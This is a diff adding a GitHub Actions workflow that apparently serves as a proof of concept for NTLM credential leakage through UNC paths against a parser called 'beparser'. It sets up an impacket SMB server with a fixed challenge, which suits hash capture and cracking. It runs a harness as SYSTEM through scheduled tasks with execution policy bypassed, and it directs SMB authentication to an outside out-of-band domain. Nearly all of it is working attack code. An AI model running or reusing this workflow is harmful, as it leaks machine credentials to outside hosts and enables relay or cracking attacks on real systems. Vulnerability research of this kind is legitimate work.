@@ -1,0 +1,66 @@
+name: beparser-profile5-token-proof
+on:
+  workflow_dispatch:
+jobs:
+  proof:
+    runs-on: windows-2022
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+      - name: Prepare isolated SMB listener
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          New-Item -ItemType Directory -Force C:/proof/share | Out-Null
+          Set-Content C:/proof/share/marker.txt 'researcher-owned isolated proof'
+          python -m pip install --disable-pip-version-check impacket==0.13.0
+          Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
+          @'
+          import logging
+          from impacket import smbserver
+          logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s')
+          s=smbserver.SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
+          s.addShare('owned',r'C:\proof\share','owned proof')
+          s.setSMB2Support(True)
+          s.setSMBChallenge('5444584e544c4d32')
+          s.start()
+          '@ | Set-Content C:/proof/smb.py
+          $p=Start-Process python -ArgumentList C:/proof/smb.py -RedirectStandardOutput C:/proof/smb.stdout -RedirectStandardError C:/proof/smb.stderr -PassThru
+          Set-Content C:/proof/smb.pid $p.Id
+          for($i=0;$i -lt 30;$i++){if(Get-NetTCPConnection -State Listen -LocalPort 445 -ErrorAction SilentlyContinue){break};Start-Sleep 1}
+          Get-NetTCPConnection -State Listen -LocalPort 445 | Format-Table -AutoSize
+          Get-FileHash ./profile5_unc_harness.exe -Algorithm SHA256
+      - name: Run exact profile 5 analogue as LocalSystem
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Continue'
+          $ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -like '10.*' -or $_.IPAddress -like '172.*' -or $_.IPAddress -like '192.168.*'} | Select-Object -First 1 -ExpandProperty IPAddress)
+          if(!$ip){throw 'no private IP'}
+          $exe=(Resolve-Path ./profile5_unc_harness.exe).Path
+          function Run-System([string]$name,[string]$unc,[string]$child,[string]$parent){
+            $cmd="& '$exe' '$unc' '$child' *> '$parent'"
+            $a=New-ScheduledTaskAction -Execute powershell.exe -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command `"$cmd`""
+            $p=New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount -RunLevel Highest
+            Register-ScheduledTask -TaskName $name -Action $a -Principal $p -Force | Out-Null
+            Start-ScheduledTask $name
+            for($i=0;$i -lt 60;$i++){Start-Sleep 1;$s=Get-ScheduledTaskInfo $name;if($s.LastRunTime -gt [datetime]::MinValue -and (Get-ScheduledTask $name).State -ne 'Running'){break}}
+            Get-ScheduledTaskInfo $name | Format-List *
+            Get-Content $parent -ErrorAction SilentlyContinue
+            Get-Content $child -ErrorAction SilentlyContinue
+          }
+          Write-Output "PRIVATE_IP=$ip"
+          Run-System beprof-local "\\$ip\owned\marker.txt" C:/proof/local-child.txt C:/proof/local-parent.txt
+          Start-Sleep 4
+          Run-System beprof-oob "\\j9adzdnyijwvlprf--beprof1787402221.oob.blackmail.zip\owned\marker.txt" C:/proof/oob-child.txt C:/proof/oob-parent.txt
+          Start-Sleep 8
+          Write-Output '=== SMB STDOUT ==='; Get-Content C:/proof/smb.stdout -ErrorAction SilentlyContinue
+          Write-Output '=== SMB STDERR ==='; Get-Content C:/proof/smb.stderr -ErrorAction SilentlyContinue
+          Write-Output '=== LOCAL CHILD ==='; Get-Content C:/proof/local-child.txt -ErrorAction SilentlyContinue
+          Write-Output '=== OOB CHILD ==='; Get-Content C:/proof/oob-child.txt -ErrorAction SilentlyContinue
+          exit 0
+      - name: Upload proof
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: beparser-profile5-proof
+          path: C:/proof
